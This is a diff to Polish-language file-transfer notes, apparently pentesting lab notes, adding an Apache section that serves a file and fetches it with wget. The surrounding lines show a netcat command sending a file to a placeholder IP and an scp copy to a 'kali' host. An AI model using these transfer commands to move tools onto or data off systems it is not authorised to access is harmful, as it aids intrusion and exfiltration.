@@ -2,6 +2,7 @@
 1. [Podzial na fragmenty](#Podzial-na-fragmenty)
 2. [Przeslanie nc](#Przeslanie-nc)
 3. [Przeslanie przez ssh scp](#Przeslanie-przez-ssh-scp)
+4. [Apache](#Apache)
 
 
 # Podzial na fragmenty
@@ -37,4 +38,14 @@ nc -n <ip> 9999 < file
 # Przeslanie przez ssh scp
 ```console
 scp file.ext kali@192.168.45.193:/tmp
+```
+
+# Apache
+Kopiujemy plik do /var/www/html
+```console
+systemctl start apache2
+```
+Pobieramy plik na innej maszynie
+```console
+wget http://naszeIP/zasob
 ```
